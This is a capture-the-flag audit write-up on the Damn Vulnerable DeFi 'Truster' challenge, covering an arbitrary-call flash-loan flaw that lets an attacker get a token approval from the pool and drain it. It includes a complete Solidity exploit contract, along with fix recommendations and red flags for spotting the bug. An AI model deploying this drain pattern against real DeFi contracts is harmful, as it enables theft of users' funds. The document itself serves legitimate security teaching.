# Truster — Audit Report

**Protocol:** Truster
**Challenge:** Damn Vulnerable DeFi
**Auditor:** 0xUnavailable
**Time Spent:** 30 minutes
**Status:** Solved

---

## Executive Summary

**Vulnerability Found:** Arbitrary external call during flashLoan allows the pool (caller) to be tricked into approving token allowances to an attacker.
**Severity:** Critical
**Attack Complexity:** Low
**Impact:** Complete loss of 1,000,000 DVT from the pool (attacker obtains allowance and drains funds)
**Root Cause:** Flash loan executor performs an unrestricted low-level call (`target.functionCall(data)`) from the pool’s context — enabling the pool to call `token.approve(attacker, amount)` and grant an attacker allowance over the pool’s tokens.

---

## Challenge Overview

**Objective:** Rescue / withdraw all 1,000,000 DVT tokens from the lending pool in a single transaction and deposit to the recovery account.

**Initial State:**

* Pool balance: 1,000,000 DVT
* Attacker balance: 0 DVT
* Pool exposes `flashLoan(amount, borrower, target, data)` and performs `target.functionCall(data)` from pool context

**Success Criteria:**

* [x] All DVT drained from pool
* [x] Funds deposited to recovery account

---

## Vulnerability Analysis

### Economic Incentive Analysis

**Attack Priority:**

1. **Approval & Drain (Primary)** — Profit: 1,000,000 DVT, Cost: Gas only

   * Likelihood: High (no access controls on `target`/`data`)
   * Impact: Critical (complete token drainage)

2. **Other flash-loan-based manipulations** — Low relevance here because the vulnerable primitive is arbitrary call.

### Technical Analysis

**Vulnerable Component:** `flashLoan(...)` implementation that executes arbitrary `target` calls from the pool’s address.

**Location:** Pool contract (flash loan implementation) + ERC20 token contract (standard approve/transferFrom semantics)

**Vulnerability Type:** Arbitrary call / approval exploitation via flash loan

**Representative vulnerable snippet**

```solidity
function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data
) external nonReentrant returns (bool) {
    // ... loan logic ...
    // Dangerous: executing arbitrary calldata on arbitrary target from pool context
    target.functionCall(data); // ← executed as if `pool` called it
    // ... repay check ...
}
```

**Why This Is Exploitable:**

* When the pool executes the supplied `target` call, `msg.sender` inside `target` and any downstream call is the pool contract.
* If `target` is the token contract (or any contract that ultimately calls `token.approve`), the pool can be tricked into approving allowances for attacker addresses.
* With an allowance set by the pool, attacker can call `token.transferFrom(pool, attacker, amount)` and drain the pool.

**Attack Prerequisites:**

* [x] Flash loan facility that accepts arbitrary `target` and `data`
* [x] ERC20 token with `approve` / `transferFrom` semantics
* [x] No validation restricting approved targets or calldata

---

## Attack Vector

### Step-by-Step Exploit (single transaction)

1. Attacker calls pool’s `flashLoan` requesting `amount = 0` (or any value) with:

   * `borrower = attacker` (irrelevant here)
   * `target = tokenAddress`
   * `data = abi.encodeWithSignature("approve(address,uint256)", attacker, 1_000_000e18)`
2. Pool executes `target.functionCall(data)` — this becomes `token.approve(attacker, 1_000_000e18)` executed by the pool, making the pool approve the attacker to spend its tokens.
3. Immediately after the flashLoan returns (still within the same transaction context if desired), attacker calls:

   * `token.transferFrom(address(pool), recovery, 1_000_000e18)` (or transfers to attacker then to recovery).
4. Pool’s tokens are drained and deposited to the recovery account.

---

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITrusterPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract TrusterExploit {
    ITrusterPool public pool;
    IERC20 public token;
    address public recovery;

    constructor(address _pool, address _token, address _recovery) {
        pool = ITrusterPool(_pool);
        token = IERC20(_token);
        recovery = _recovery;
    }

    function attack() external {
        // Request flashLoan that causes the pool to approve this contract
        bytes memory approveData = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            1_000_000e18
        );

        // Call flashLoan — the pool will call token.approve(this, amount) from pool context
        pool.flashLoan(0, address(this), address(token), approveData);

        // Now that the pool approved this contract, transfer tokens out
        token.transferFrom(address(pool), recovery, 1_000_000e18);
    }
}
```

**Test assertions (pseudo):**

* `token.balanceOf(pool) == 0`
* `token.balanceOf(recovery) == 1_000_000e18`

---

## Recommendations

### Immediate Fixes

**1. Do NOT perform arbitrary calls from pool context.** Replace risky `target.functionCall(data)` with a restricted flow.

**2. Whitelist / Validate Calls**

* Only allow `target` to be `borrower` or a small set of safe contracts.
* Disallow calls to token contracts or any `approve` / `transfer` related functions.

**3. Use parameterized callback interfaces**

* Require borrowers to implement a known callback interface (e.g., `IFlashLoanReceiver.executeFlashLoan(address token, uint256 amount, bytes calldata data)`) and call the borrower's callback — *do not* allow arbitrary target addresses.

```solidity
// BEFORE (vulnerable)
target.functionCall(data);

// AFTER (safer)
require(target == borrower, "target must be borrower");
IBorrower(borrower).executeFlashLoan(msg.sender, token, amount, data);
```

**4. Principle of Least Privilege**

* Never execute external logic from a privileged contract account that holds user funds.

---

## Lessons Learned

### Pattern Identified

**Pattern Name:** Arbitrary Call During Flash Loan → Approval Drain

**Description:** Allowing callers to supply arbitrary target + calldata that the lending contract executes from the contract’s own address enables the pool to be coerced into giving token allowances or performing privileged actions.

**How to Spot It (Red flags):**

* `target` and `data` are user-controlled and executed by the pool.
* Pool performs low-level call from its own address.
* No filters on calldata (approve/transferFrom) or target address.

**Key Takeaways:**

1. External calls from fund-holding contracts are highly dangerous.
2. Use explicit, restricted callback interfaces instead of arbitrary delegate calls.
3. Validate and/or whitelist callable targets and disallow interactions with token contracts.

**Real-World Examples:** Similar approval-based drains have been used in CTF-style challenges and real exploits that abuse unrestricted external calls.

---

## Metadata

**Tools Used:** Manual code review, Foundry-style POC design
**Pattern Library Entry:** `#02-arbitrary-flashloan-call-approval-drain`
**Time Breakdown:**

* 00:00-00:05 — Understand `flashLoan` surface
* 00:05-00:15 — Map attack primitive (approve-from-pool)
* 00:15-00:25 — Write POC & verify logic
* 00:25-00:30 — Prepare recommendations & write-up

**Total Time:** 30 minutes

---

*Report generated on [30-10-2025] by [0xUnavailable]*  
*GitHub: [https://github.com/0xUnavailable]*  
*Twitter: [0xUnavailable]*